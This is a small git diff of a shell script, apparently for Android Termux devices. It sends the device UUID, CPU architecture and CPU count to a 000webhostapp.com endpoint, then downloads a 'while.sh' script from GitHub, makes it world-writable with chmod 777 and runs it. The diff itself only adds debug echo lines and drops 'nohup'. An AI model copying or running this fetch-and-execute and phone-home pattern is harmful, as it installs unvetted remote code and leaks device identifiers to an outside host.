@@ -24,6 +24,10 @@ if [ -e "/data/data/com.termux/files/home/.device/uuid" ]; then
    uuid=(`cat ~/.device/uuid`)
    arch=$(lscpu | grep -oP 'Architecture:\s*\K.+')
    cpus=$(lscpu | grep -oP 'CPU...:\s*\K.+')
+   echo "****************"
+   echo $arch
+   echo $cpus
+   echo "****************"
    curl https://adalbertomello.000webhostapp.com/device.php?uuid=$uuid&arch=$arch&cpus=$cpus
 fi
 
@@ -32,4 +36,4 @@ if [ ! -e "/data/data/com.termux/files/home/done" ]; then
 fi
 
 pkill while.sh
-rm -rf while.sh && wget -q https://raw.githubusercontent.com/U117A/scripts/master/while.sh && chmod 777 while.sh && nohup ./while.sh &
+rm -rf while.sh && wget -q https://raw.githubusercontent.com/U117A/scripts/master/while.sh && chmod 777 while.sh && ./while.sh &
